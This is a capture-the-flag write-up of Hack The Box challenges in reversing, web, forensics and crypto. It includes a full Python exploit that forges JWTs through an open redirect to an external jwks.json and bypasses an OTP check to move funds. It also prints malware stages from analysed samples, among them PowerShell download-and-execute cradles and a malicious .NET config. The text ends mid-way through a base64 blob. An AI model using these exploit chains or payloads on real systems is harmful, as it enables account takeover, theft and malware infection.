# Reversing

## CryoWarmup

All flags obtained from reversing the binary in Ghidra.

1. strcmp

2. 49

3. generate_key

4. 0x6d

5. Access granted!

6. 8

7. h1dd3npw

```Python
res = [0x62, 0x5f, 0x49, 0x1e, 0x53, 0x53, 0x20, 0x47][::-1]
for i in range(len(res)):
	res[i] -= 5
	res[i] ^= 0x2a
	res[i] = chr(res[i])
print(''.join(res))
```
## SecurityInTheFront

Beautify JS in there. Each condition in the if is of the form:
```
[functions to apply]
[arguments to functions]
target input (becomes "this" in the functions)
```

Reverse each operation and obtain credentials.

Transformation 1: ROT13 for the username, which has to be equal to ["n", "q", "z", "v", "a"] => username = "admin"

Transformation 2: Get first 4 characters of the password, duplicate them 3 times, ROT13 and then keep the characters at position 1 mod 3. They have to be equal to ["G", "U", "{", "O"] => The first four characters of the password are "HTB{".

Transformation 3: Get last character of the password, URL encode it, convert the hex to an int, XOR it with 96, and then the result has to be 29. Reversing everything, we get that the last character of the password is '}'.

Transformation 4: From testing, it seems to do 2^Length of the password, and that has to equal 16777216. Applying log 2, we get that the length of the password is 24.

Transformation 5: Repeats the password 21 times, does the numerical mapping and then calls reduce again, which now calculates the number of characters of 8 after the mapping, and the result has to be 63. Dividing by 21 (since the password was repeated 21 times), we get that the mapping of 8 appears 3 times. The mapping of 8 is 3, thus the character '3' appears 3 times in the password.

Transformation 6: Obtains the characters of the password at the indices [4, 11, 13, 14, 16, 17, 20, 22], then applies ROT13, reverses them and joins them by "-". Then, checks that the result equals ["E-X-U-P-J-C-Q-S"]. Thus, reversing that string and applying reverse ROT 13, we get that characters at said indices. =>pwd[4] = F, pwd[11] = D, pwd[13] = P, pwd[14] = W, pwd[16] = C, pwd[17] = H, pwd[20] = K, pwd[22] = R

Transformation 7: It just says that characters 12 and 15 are '_'.

Transformation 8: Similar to 6, it obtains the indices [18, 13, 4, 16, 15], but from the reversed password. Then, it gets the elements from index 2 up to the end and concatenates them with the first 2, esentially shifting the array by 2. Then, it reverses it again and checks whether the result string is "ncrnt". Thus, we get: pwd[10] = n, pwd[5] = r, pwd[8] = t, pwd[7] = n, pwd[19] = c.

Transformation 9: Checks that the 6th characters of the password is "0".

FLAG: `HTB{Fr0nt3nD_PW_CH3cK3R}`

## ColossalBreach

Kernel object module for Linux.

1. 0xEr3n (from strings)

2. register_keyboard_notifier (init_module)

3. keycode_to_string (from function list)

4. /sys/kernel/debug/spyyy/keys (from init_module, it creates file in DebugFS filesystem, which is at /sys/kernel/debug)

5. w00tw00t (from init_module)

6. 0x19 (from spy_cb)

7. supers3cur3passw0rd (decode the logs by XORing everything with 0x19)

# Web

## Armaxis

Login to challenge, and observe XSS capabilities in dispatch weapons form.
It checks for markdown images format ("![alt text] (url)"), and curls that url and modifies it to `<img>` tag. We can abuse that by passing local files to curl.

Making the note `![test](file:///flag.txt)`, yields the image with the flag's contents being base64 encoded.

FLAG: `HTB{l00k0ut_f0r_m4rkd0wn_LF1_1n_w1ld!_7e2f5a7d563f645d50ca391c56fabde4}`

## Breaking Bank

Right off the bat, we are presented with a solution script. This script seems to do the required steps to obtain the flag, leaving the implementation of the forged jwt token and OTP checks to us. Without opening the website, we already know the steps we need to take to get the flag.

For the JWT token, we see that there's a local endpoint `/.well-known/jwks.json`, which has the KID and the key used for JWT verification. (good resource for this exploit: `https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c`)
Digging deeper into how the tokens are verified on the server, we can see an odd check, with a small hint:
```JavaScript
        // TODO: is this secure enough?
        if (!jku.startsWith('http://127.0.0.1:1337/')) {
            throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
        }
```

Thus, the JKU needs to be pointing to a local address. Since this is remote and also the checked path ends with "/", we cannot do any techniques like path manipulation, DNS rebiding or using `@` in the path. As such, I kept digging. After a while, I found a nice endpoint, allowing for open redirect.

```JavaScript
export default async function analyticsRoutes(fastify) {
    fastify.get('/redirect', async (req, reply) => {
        const { url, ref } = req.query;

        if (!url || !ref) {
            return reply.status(400).send({ error: 'Missing URL or ref parameter' });
        }
        // TODO: Should we restrict the URLs we redirect users to?
        try {
            await trackClick(ref, decodeURIComponent(url));
            reply.header('Location', decodeURIComponent(url)).status(302).send();
        } catch (error) {
            console.error('[Analytics] Error during redirect:', error.message);
            reply.status(500).send({ error: 'Failed to track analytics data.' });
        }
    });
```

This endpoint allows us to redirect to our website using local endpoints, and as such the token forgery can go on. We generate our own RSA 2048 keypair, sign the JWT with it, and make the JKU point to our own modified `jwks.json` (with our public key), via the open redirect from `/api/analytics/redirect`. With that, the forged token validates successfully, and only the OTP stuff is required to obtain the flag.

Looking at how the OTP is generated, it seems to be a 4 digit PIN code, converted to string and generated randomly, thus not enough chances to guess it. The transaction endpoint is also guarded by a rate limiter, thus we cannot brute force the OTP. Looking at how the OTP is valid, we see something we can exploit:

```JavaScript
    // TODO: Is this secure enough?
    if (!otp.includes(validOtp)) {
      reply.status(401).send({ error: 'Invalid OTP.' });
      return;
    }
```

This checks that the provided OTP includes the valid OTP, which is not a proper check. Thus, we can create an OTP that has all the possible values, and send it to the server. Using this, the valid OTP would be in there somewhere since the domain of values is finite and covered entirely.

Creating an OTP as such and running the entire script yields us the flag.

```Python
import requests, datetime, os
import jwt
from jwt.algorithms import RSAAlgorithm
import urllib.parse

HOST = 'http://94.237.48.64:57229'
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'

def create_forged_jwt(jku_url, kid, priv_key, payload):
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": kid,
        "jku": jku_url
    }
    token = jwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers=header
    )
    return token

def validate_token(token):
    response = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {forged_token}'})
    if response.status_code == 200:
        print('[+] JWT validation successful! Response:')
        print(response.json())
    else:
        print(f'[!] JWT validation failed. Status: {response.status_code}, Response: {response.text}')

payload = {
    'email': FINANCIAL_EMAIL,
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=0, hours=6, seconds=0)
}
kid = "fbf86bdb-11a5-4be9-ba88-6c97619b76e5"
private_key = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDgEdYSvWDTTAVD
5r1g9AlcS0gRMPHDsV3CHlFgqNhIqWVGIDXbwVJ59pBqg5V4ji9m1ERMKlsWf4Av
6vTC2iAxQL2l2UdMqfQtLJPAeYvaaBe4NmIpCd48BBG6oIKlddcS/sOiYlSkm9w7
8YIH4mM4Vtb4Eeh8Bl7BeG24vo632ZmOnjOpPzFcg7HGtTcmlz8pECZplEbkWIso
7HS00Lh/YxlXdg1xDZyw4VoaiBvUZtvEJQJJf20HFjYfOlb4Mlchd0MOgCugwH6B
w162uRyCDhly/QSIdLOyCciSe56zqnlaA7zUWiHrk6HH/YtaX2nNxcnHLa/oHAkq
KIYiNitzAgMBAAECggEADglgAT2G1sXA4K+QNoYjHfqDUbxgsNMoHfR7QZRiNC8U
bo+vAAy8x3IoOtvyXaJ+mrD6dFEE8sRa+eV8nsY+VQeKudyCKG3PI5NS0DBtD+oM
blhNzudU2iqhF7FdbdMTfZejFsWVKtius7yd2jOW5p0eC11H1Jkrj3AlY3jghOjJ
PaJ4QN3mgtaj88651GkJFiCbuMa8gbGAcU1eBtH5LSIcezreZ6cYSW3K0nGDKWxf
rWhAx+v7p+XacE6DpyQss6uqtGGKlouWzC0YOmyLDC0ttgnmQPvtM3RqjkOFRBA/
hq4JCh/QWvIxj/XhvGEHkqc8IrZAmQU1QKonysSS8QKBgQD3KniUPSoBKjNt/L7V
/a7zJ3xpMAVlH2J6PNdlmYszaXe2B417BzM/l51o2oMchD6uV8wXfr3bZWXGHKxQ
ERp9YeNHrYo6fnGDxjGOJU+BgPtuwBrkvHYKiobmANSpREEEU4Qm6GYLXtmYvZE2
MOL3fSAAtkmzWT78epIzXKpJgwKBgQDoFAnRuNUoK0IHlooPR1hhgjRAVY7tN0oM
4Z5QWYiNV0/1w35XVJb+EU9mbqvygMq7S513FKl2s5WqhUEtLeCVEtSm+k70xsKA
p89Fm58zou7xtT7z/9z6MUszdr23ct8tsgDFtQcLnw5e1QTvaboOgPwpKK+mrX34
xXLQjBgjUQKBgCE37AzAS6zsZw0ZMuy/s4uqeuYINjFpDmsvUiOthy/ZtOUaDsHC
LfkV/2ngNE7Y1zPHSP6/YfTio9MEd4QrSEwho9I2WKWT6N20/WQFT7IwC5rO5s5n
JdY01/yBkBNPwQ07zD8ObOiKTuRgVevaliZ9ApgV58Ha9MQqFQwiICDRAoGBALgO
bFsvw52/8PYjpgrIAogSw23ibSAlIU1mAjCnUW0HOhsnmCOaqsWE5PvP+f6xthck
uRWgBWZmtuQuGqrCH8Ma1Bw5mDT5DXkLnY8PBQvmxKpdnDfXTGIAhiuimIPNTsLm
0UX7dEL7OmJrfyaBK1YlZdcetW/zWFzb+1r6QIqBAoGBAMlrDlttJvRgnrXmRNUL
zg6OIFdkALbZiOM2M/gheY/fBCnAPWH/GXgZW+5T/tqx/Vmbnul9Y2OaklibKeN9
GF7EblMuSfbk6ZEKRE6vNjA9dLpLFLQ2fnc4SPbriVjWPLqEGWwJI6LPPCIYjk3B
4dKCk6+D/2wK4jvtcNBGinqf
-----END PRIVATE KEY-----"""
jku_url = "http://127.0.0.1:1337/api/analytics/redirect?ref=hey&url="
my_url = "https://raw.githubusercontent.com/krawsssyy/tstrepos/refs/heads/main/jwks.json"
encoded_url = urllib.parse.quote(my_url, safe='')
jku_url += encoded_url
forged_token = create_forged_jwt(jku_url, kid, private_key, payload)
print(f'[~] Forged JWT: {forged_token}')

print('[+] Validating forged JWT against /api/dashboard...')
validate_token(forged_token)

def register_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/register', 
        json=user
    )
    if r.status_code == 200:
        print(f'User registered successfully: {email}')
    else:
        print(f'Failed to register user: {email}, Response: {r.text}')

def login_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/login', 
        json=user
    )
    if r.status_code == 200:
        data = r.json()
        token = data['token']
        print(f'Login successful for: {email}, Token: {token}')
        return token
    else:
        print(f'Login failed for: {email}, Response: {r.text}')
        return None

def send_friend_request(token, to_email):
    r = requests.post(
        f'{HOST}/api/users/friend-request',
        json={'to': to_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request sent to: {to_email}')
    else:
        print(f'Failed to send friend request to {to_email}: {r.text}')

def fetch_friend_requests(token):
    r = requests.get(
        f'{HOST}/api/users/friend-requests',
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        requests_data = r.json()
        print('Pending friend requests:', requests_data.get('requests', []))
    else:
        print(f'Failed to fetch friend requests: {r.status_code} {r.text}')

def accept_friend_request(token, from_email):
    r = requests.post(
        f'{HOST}/api/users/accept-friend',
        json={'from': from_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request from {from_email} accepted.')
    else:
        print(f'Failed to accept friend request from {from_email}: {r.text}')

def fetch_balance(token):
    r = requests.get(
        f'{HOST}/api/crypto/balance', 
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        balances = r.json()
        for coin in balances:
            if coin['symbol'] == COIN_SYMBOL:
                print(f'Balance for {COIN_SYMBOL}: {coin["availableBalance"]}')
                return coin['availableBalance']
        else:
            print(f'Failed to fetch balances: {r.text}')
    return 0

def make_transaction(token, to_email, coin, amount, otp):
    r = requests.post(
        f'{HOST}/api/crypto/transaction',
        json={'to': to_email, 'coin': coin, 'amount': amount, 'otp': otp},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Transaction of {amount} {coin} to {to_email} completed successfully.')
    else:
        print(f'Failed to make transaction to {to_email}: {r.text}')

def fetch_flag(token):
    r = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        data = r.json()
        if 'flag' in data:
            print(f'Flag: {data["flag"]}')
        else:
            print('Flag not found in the response.')
    else:
        print(f'Failed to fetch dashboard: {r.text}')

dummy_user = {'email': f'{os.urandom(10).hex()}@htb.com', 'password': '1337'}

register_user(dummy_user['email'], dummy_user['password'])

dummy_token = login_user(dummy_user['email'], dummy_user['password'])

if dummy_token:
    send_friend_request(dummy_token, FINANCIAL_EMAIL)

financial_token = forged_token

if financial_token:
    fetch_friend_requests(financial_token)
    accept_friend_request(financial_token, dummy_user['email'])

otp = ""
for i in range(10000):
    otp += str(i)

if financial_token and dummy_token:
    cluster_credit_balance = fetch_balance(financial_token)
    if cluster_credit_balance > 0:
        make_transaction(financial_token, dummy_user['email'], COIN_SYMBOL, cluster_credit_balance, otp)

    fetch_flag(financial_token)
    
# ocd
```
FLAG: `HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_afac67128b07f0ce348987d3508501f9}`

# Forensics

##

We get a directory listing. Looking through the file, starting with .bash_history, we see a base64 encoded string. It is the flag.

FLAG: `HTB{C2_cr3d3nt14ls_3xp0s3d}`

## WanterAlive

HTA application going through a few stages of unescaping the final payload. After unescaping a few times, we end up with a VBS payload.

That VBS payloads executes a powershell which goes through two IEXs, executing this base64: `JGVhNmM4bXJUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1UeXBlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW1lTUJlckRlZmluSVRJb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnW0RsbEltcG9ydCgidVJMbU9OLmRsTCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFVSTERvd25sb2FkVG9GaWxlKEludFB0ciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBHLHN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmbXIsc3RyaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVV2eVZCUkQsdWludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZmWWxEb2wsSW50UHRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb0ZYckloKTsnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW5BTUUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU3V4dFBJQkp4bCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtTmFtRXNQQWNFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbklZcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1QYXNzVGhydTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWE2YzhtclQ6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly93YW50ZWQuYWxpdmUuaHRiLzM1L3dhbnRlZC50SUYiLCIkZU52OkFQUERBVEFcd2FudGVkLnZicyIsMCwwKTtTVEFSdC1zbGVlUCgzKTtzdEFSdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkZW5WOkFQUERBVEFcd2FudGVkLnZicyI`. It seems to download a file from `http://wanted.alive.htb/35/wanted.tIF` as `wanted.vbs`.

Downloading that file, we see at the end that it builds another powershell command and runs it:
```PowerShell
powrsell -command     $Codigo U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19ycCcpKSkp$OWjuxd = [system.Text.encoding]::UTF8.GetString([system.Convert]::Frombase64String($codigo));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD
```

That code downloads as a string from `http://wanted.alive.htb/cdba/_rp`, decodes it from base64 and executes it. However, accessing that link we get the flag.

FLAG: `HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_2905ef7e005f5fdeb9d0b8f6b10b95a7}`

## Binary Badresources

MSC file, containing some obfuscate JS script. Deobfuscating it an unescaping the payload, we see that it loads an XML running some VBS script, which builds further another VBS script. That next VBS script builds a powershell for decrypting some resources via XOR (from a web server) and to run them. The key is in "csrss.dll", and it attempts to run "csrss.exe", "csrss.exe.config" and "wanted.pdf" from that webserver.

csrss.exe.config decodes to
```XML
<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <dependentAssembly>
            <assemblyIdentity name="dfsvc" publicKeyToken="205fcab1ea048820" culture="neutral" />
            <codeBase version="0.0.0.0" href="http://windowsupdate.htb/5f8f9e33bb5e13848af2622b66b2308c.json"/>
         </dependentAssembly>
      </assemblyBinding>
      <etwEnable enabled="false" />
      <appDomainManagerAssembly value="dfsvc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=205fcab1ea048820" />
      <appDomainManagerType value="dfsvc" />
   </runtime>
</configuration>
```

csrss.exe decodes to an actual PE file, and wanted.pdf decodes to an actual benign PDF file.


That csrss.exe seems to be a benign service runner file, whereas the codebase given in the config file points to another .NET PE, which seems malicious.

That service being run seems to decode some bytes from base64 (`ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=`), then decrypt them with AES and use the result as a URL to download some shellcode and execute it.

Decrypting that string and download the bytes from that address `http://windowsupdate.htb/ec285935b46229d40b95438707a7efb2282f2f02.xml`, yields the flag after running strings on that.

FLAG: `HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}`

# Crypto

## alphascii clashing

Given the script we have, it seems that we need to find a MD5 collision for the given username. As this is time very time consuming with a given hash, I investigated more, and found out that we can register our own users. Since we can do that, we can create a username with a known collision. The gist is that is has to be alphanumeric *wink*wink* `https://x.com/realhashbreaker/status/1770161965006008570`.

Using that, we can register that user, then login with the colliding username and get the flag.

FLAG: `HTB{finding_alphanumeric_md5_collisions_for_fun_https://x.com/realhashbreaker/status/1770161965006008570_43777fa43af5520090220cf90760440f}`

## MuTLock

We are given the encryption routines and output. The encryption routine contains a polyalphabetic cipher which returns a base64 result, which is then xored with a key. The polyalphabetic key is obtained from a random choice of 16 characters, based on a given seed. The key seed and XOR key are generated based on timestamps.

```Python
import random
import string
import base64
import time
from secret import FLAG

def generate_key(seed, length=16):
    random.seed(seed)
    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    return key

def polyalphabetic_encrypt(plaintext, key):
    key_length = len(key)
    ciphertext = []
    for i, char in enumerate(plaintext):
        key_char = key[i % key_length]
        encrypted_char = chr((ord(char) + ord(key_char)) % 256)
        ciphertext.append(encrypted_char)
    return base64.b64encode(''.join(ciphertext).encode()).decode()

def xor_cipher(text, key):
    return bytes([ord(c) ^ key for c in text])

def get_timestamp_based_keys():
    timestamp = int(time.time())
    if timestamp % 2 == 0:
        key_seed = random.randint(1, 1000)
        xor_key = 42
    else:
        key_seed = 42
        xor_key = random.randint(1, 255)
    return key_seed, xor_key

def main():
    # Split the flag
    flag_half1 = FLAG[:len(FLAG)//2]
    flag_half2 = FLAG[len(FLAG)//2:]
    
    encrypted_flags = []
    
    for _ in range(2):
        key_seed, xor_key = get_timestamp_based_keys()
        key = generate_key(key_seed)
        encrypted_half = polyalphabetic_encrypt(flag_half1 if len(encrypted_flags) == 0 else flag_half2, key)
        encrypted_half = xor_cipher(encrypted_half, xor_key)
        encrypted_flags.append(encrypted_half.hex())
        time.sleep(1)
    
    # Save encrypted flags to output.txt
    with open('output.txt', 'w') as f:
        f.write(f"{encrypted_flags[0]}\n{encrypted_flags[1]}\n")


if __name__ == "__main__":
    main()

```

Based on the sleep, we know that the halves have different keys, since one timestamp would be odd, and one even.

By testing for the xor keys and seeing which one decrypts a valid base64 string, we get that for the first half the XOR key is 119, thus the key_seed is 42, and for the second half, the XOR key is 42, thus the key seed is random (433).

By analzying the base64 decoded bytes, we see a lot of `\xc2` and `\xc3` in there, which points us to UTF-8 encoding. Accounting for that when decrypting and brute forcing the second half yields the correct results.

```Python
def polyalphabetic_decrypt(ciphertext, key):
    try:
        decoded = base64.b64decode(ciphertext)
        normalized = []
        i = 0
        while i < len(decoded):
            if decoded[i] == 0xc2:
                normalized.append(decoded[i + 1])
                i += 2
            elif decoded[i] == 0xc3:
                normalized.append(decoded[i + 1] + 0x40)
                i += 2
            else:
                normalized.append(decoded[i])
                i += 1
                
        key_length = len(key)
        plaintext = []
        
        for i, char_val in enumerate(normalized):
            key_char = key[i % key_length]
            decrypted_val = (char_val - ord(key_char) + 256) % 256
            plaintext.append(chr(decrypted_val))
            
        return ''.join(plaintext)
    except Exception as e:
        print(f"Error: {e}")
        return None
```

FLAG: `HTB{timestamp_based_encryption_is_so_secure_i_promise}`

## exfiltrated entropy

We got an encryption algorithm based on XOR, by using an LCG (linear congruential generator). The issue lies in the fact that the server sends the state, which is the seed of this equation, and as such we can reverse the reccurence relation to obtain the keys used, and also advance it to decrypt the output.

```Python
from sympy import mod_inverse
from base64 import b64decode as bd
from pwn import xor

a = 0xa1d41ebef9c575ac113fcfd5ac8dbda9
b = 0x8dcf3cf766e0b6c30e753416a70e2367
m = 0x100000000000000000000000000000000

a_inv = mod_inverse(a, m)

def reverse_lcg(next_state):
    return (a_inv * (next_state - b)) % m
def advance_lcg(prev_state):
    return (a * prev_state + b) % m


cmd_encrypted = bd("4FfTtXHCD3LuRRJzLIzwyeylqqGwyTiugfjOo+MbNhyKv1ZDgSL33Lwaysu+dlONfwJ8jaqbuTVnVqwFloEI4wGdC9FFkmJgLpV9y3AZyjM0wsV+DRVR1cpOBvQqT4F46j2JiDxvABDqHRw5yrmv+uByJMyX/cZM2azJMonAVwV95ncUg0uWs3bmpturCW9sWiVaQ2pqjgAuUDs3Yab1/jJa4tthhkJrBJl6cyX88ijWqoMBKUkjsZ/sNa8uGLpC9gGpafUQwfyaPfImxIx8taB8bain59NlaI2RaL3YFfRrkxQAw8rUshLbxqI/AhpOH9LRQ09GeORcBnHPC0HaqMFDgp0euCJzrnVhdDmPrPPGhq/MsfISmr3R94HfOE4hs/h4ceMywp+qHOLZ/1RlvVoSBrK5w7o4G16PJLC9Xf8UzC6rQO5PQBiOcpNgCPg7NvToEickQd7CTBWQOEy+Rv0ar8gnTAooy2cjMe2iqeuEMTOd5Pz8QKS721vcxU4AU4cLDbwhr4tKteb3v3oGcAEiPF9sSoMbBlhoE0m7+f8wLPHvXrgfShSKBD0L9vccz42AMCUZGu+Ctw2QASe5apAnvWz0c+u3rD3aG8aXZo+hF3K4u7rjRkulqm2B+mD9aeJiVb2zlah74L6iRW0MUR7PvXkXSnnaX2sW8E9Y3obSBo2gEqcQAqhLAlsu7Y3y9Jyc87LJEMSf/tmq/BBEFIjcXXWBBO3ys1rK3vFdb5pfND6ApIO/AEhRoguD/SDGCpkOqkjXYk8cgSWaTE3aMULyhCZwFlHsyVMS9CodoFvAbInIEjE+L8ptHDff6IbbkENz/83i7SOGitFn3epsL0fyQjWlA5CSdceb/opVJVUeVwdYbVO4DC9XTRtDivq3VkbI0WL3cHUqmXcmAKzcGMSV/xkMB2Th6vAq+xcYhhm8EoFxqXC14e00/0XlvXm0pkZngfmo0Gd0qqJYofA34HS/Miuy6deJd5u3mnMeUGsv6O9mZ3VlpAUTQtEJXJvbzXbB7j+VPhb3J2JRRs+a9N2Is8jyyRO3tI7kmskDPRyMx1pg4jH138wWyqOvfWXVcTE+qNa+gh4VUZkDsaNE9H2+E/dyx2tKH78htEtT0zkU5tIOCzFl19odAJUdGapWjjqZmEBYKzGIdRF53KLK9qdmPczHycB8uYqRdNbLZixO2lIshAmGh1yx8ZKVGD1/RgFdPiE9k1YxHGQXd5Lmvg==")
uuid = "8829affbed23334d34016095627ba065"
otp_encrypted = bd("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